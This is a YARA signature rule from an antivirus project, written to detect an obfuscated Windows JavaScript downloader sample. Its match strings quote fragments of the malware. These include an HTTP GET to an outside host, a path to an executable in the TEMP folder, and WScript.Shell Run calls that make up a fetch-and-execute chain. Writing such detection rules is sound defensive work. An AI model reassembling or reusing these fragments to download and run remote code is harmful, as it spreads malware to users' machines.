rule sig_20160401_61e73e6ecc18bf5b0235d953dae618f5 {
  meta:
    description = "datamaliciousorder - file 20160401_61e73e6ecc18bf5b0235d953dae618f5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f3987a73d202282e1ff99c5f30fc4ead7b95700ebcbb7b8363fc38ecfe527c90"

  strings:
    $s1  = "EqpDap[KpErx](\"G\" + \"ET\", \"http://ledivinecomedie.com/m9woq\", false);" fullword ascii
    $s2  = "function FusDo(OosOy, GckHvm){FcdLbl = FcdLbl * 1; return OosOy - GckHvm;};" fullword ascii
    $s3  = "var WneJft = function BfrOy() {return WScript[DvsMy](\"WScript\"+\".Shell\");}(), XxPcp = 11;" fullword ascii
    $s4  = "if (EqpDap[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function XeEfe() {return WneJft[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"KT3r8ljQKJoTBEKa.ex\" + \"e\";};" fullword ascii
    $s6  = "function UeqRx(){return EdrBoo + \"\";};" fullword ascii
    $s7  = "function PsNka() {return ((OdiPnr == true) && (OdiPnr == RbzIlu)) ? 1 : FcdLbl;};" fullword ascii
    $s8  = "return FusDo(NsoPp, GqNua);" fullword ascii
    $s9  = "OdiPnr = true; " fullword ascii
    $s10 = "function OfWax(TdfWty){WneJft[\"R\"+\"un\"](TdfWty, FcdLbl, FcdLbl);};" fullword ascii
    $s11 = "var RbzIlu = false;" fullword ascii
    $s12 = "var YhEc = false;" fullword ascii
    $s13 = "RbzIlu = true; " fullword ascii
    $s14 = "function LshTlz()" fullword ascii
    $s15 = "function GrnPb(){return 23;};" fullword ascii
    $s16 = "function QdtDd(JhSa) {var JuYq = (1, 2, 3, 4, 5, JhSa); return JuYq;};" fullword ascii
    $s17 = "var QqcXpo = new this[\"Date\"]();" fullword ascii
    $s18 = "}while (MjTo);" fullword ascii
    $s19 = "var OdiPnr = false;" fullword ascii
    $s20 = "function EimJh(){return DvsMy;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}